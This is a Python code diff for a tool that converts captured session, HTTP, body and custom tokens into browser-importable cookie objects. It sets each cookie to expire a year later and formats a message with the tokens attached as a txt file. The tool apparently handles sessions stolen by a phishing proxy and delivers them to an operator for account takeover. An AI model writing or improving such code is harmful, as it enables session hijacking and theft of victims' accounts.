@@ -19,30 +19,96 @@ def generate_random_string(length: int = 10) -> str:
 def process_all_tokens(session_tokens: str, http_tokens: str, body_tokens: str, custom_tokens: str) -> list:
     """
     Process and extract tokens from all token types.
-    Similar to Go's processAllTokens function.
+    Handles both nested cookie structures and flat token structures (body/http tokens).
     """
     consolidated_tokens = []
     
-    for token_json in [session_tokens, http_tokens, body_tokens, custom_tokens]:
-        if not token_json or token_json == "null" or token_json.strip() == "null":
-            continue
-        
+    # Process cookie tokens (nested structure: domain -> cookie_name -> cookie_data)
+    if session_tokens and session_tokens != "null" and session_tokens.strip() != "null":
         try:
-            raw_tokens = json.loads(token_json)
-            if not raw_tokens or not isinstance(raw_tokens, dict):
-                continue
-            
-            # Extract tokens from nested structure
-            tokens = extract_tokens(raw_tokens)
-            consolidated_tokens.extend(tokens)
-        except json.JSONDecodeError:
-            continue
+            raw_tokens = json.loads(session_tokens)
+            if raw_tokens and isinstance(raw_tokens, dict):
+                tokens = extract_tokens(raw_tokens, token_type="cookie")
+                consolidated_tokens.extend(tokens)
+        except (json.JSONDecodeError, Exception) as e:
+            print(f"Warning: error parsing session tokens: {e}")
+    
+    # Process HTTP tokens (flat structure: token_name -> token_value)
+    if http_tokens and http_tokens != "null" and http_tokens.strip() != "null":
+        try:
+            raw_tokens = json.loads(http_tokens)
+            if raw_tokens and isinstance(raw_tokens, dict):
+                tokens = extract_flat_tokens(raw_tokens, token_type="http")
+                consolidated_tokens.extend(tokens)
+        except (json.JSONDecodeError, Exception) as e:
+            print(f"Warning: error parsing http tokens: {e}")
+    
+    # Process body tokens (flat structure: token_name -> token_value)
+    if body_tokens and body_tokens != "null" and body_tokens.strip() != "null":
+        try:
+            raw_tokens = json.loads(body_tokens)
+            if raw_tokens and isinstance(raw_tokens, dict):
+                tokens = extract_flat_tokens(raw_tokens, token_type="body")
+                consolidated_tokens.extend(tokens)
+        except (json.JSONDecodeError, Exception) as e:
+            print(f"Warning: error parsing body tokens: {e}")
+    
+    # Process custom tokens (can be nested or flat, try both)
+    if custom_tokens and custom_tokens != "null" and custom_tokens.strip() != "null":
+        try:
+            raw_tokens = json.loads(custom_tokens)
+            if raw_tokens and isinstance(raw_tokens, dict):
+                # Try nested structure first (cookie-like)
+                tokens = extract_tokens(raw_tokens, token_type="custom")
+                if not tokens:
+                    # If no tokens extracted, try flat structure
+                    tokens = extract_flat_tokens(raw_tokens, token_type="custom")
+                consolidated_tokens.extend(tokens)
+        except (json.JSONDecodeError, Exception) as e:
+            print(f"Warning: error parsing custom tokens: {e}")
     
     return consolidated_tokens
 
-def extract_tokens(input_data: Dict) -> list:
+def extract_flat_tokens(input_data: Dict, token_type: str = "token") -> list:
     """
-    Extract tokens from nested dictionary structure.
+    Extract tokens from flat dictionary structure (token_name -> token_value).
+    Used for body_tokens and http_tokens which are stored as flat maps.
+    """
+    tokens = []
+    
+    for token_name, token_value in input_data.items():
+        # Skip if value is not a string (shouldn't happen, but be safe)
+        if not isinstance(token_value, str):
+            token_value = str(token_value) if token_value is not None else ""
+        
+        # Create token object in cookie format for compatibility
+        token = {
+            "name": token_name,
+            "value": token_value,
+            "domain": "",  # Flat tokens don't have domain
+            "hostOnly": True,  # Default for tokens
+            "path": "/",  # Default path
+            "secure": True,  # Tokens are typically secure
+            "httpOnly": False,  # Tokens are usually accessible via JS
+            "sameSite": "",
+            "session": False,
+            "firstPartyDomain": "",
+            "partitionKey": None,
+            "storeId": None,
+            "tokenType": token_type,  # Mark the token type for reference
+        }
+        
+        # Set expiration date (1 year from now)
+        exp = int(datetime.now().timestamp()) + (365 * 24 * 60 * 60)
+        token["expirationDate"] = exp
+        
+        tokens.append(token)
+    
+    return tokens
+
+def extract_tokens(input_data: Dict, token_type: str = "cookie") -> list:
+    """
+    Extract tokens from nested dictionary structure (domain -> cookie_name -> cookie_data).
     EXACTLY like Go's extractTokens function - extracts ALL tokens, no filtering.
     """
     tokens = []
@@ -144,6 +210,9 @@ def extract_tokens(input_data: Dict) -> list:
             exp = int(datetime.now().timestamp()) + (365 * 24 * 60 * 60)
             token["expirationDate"] = exp
             
+            # Add token type for reference
+            token["tokenType"] = token_type
+            
             # ALWAYS append token - Go code always appends, no filtering
             tokens.append(token)
     
@@ -214,4 +283,3 @@ def format_session_message(session_data: Dict) -> str:
 📦 Tokens are added in txt file and attached separately in message.
 """
     return message
-
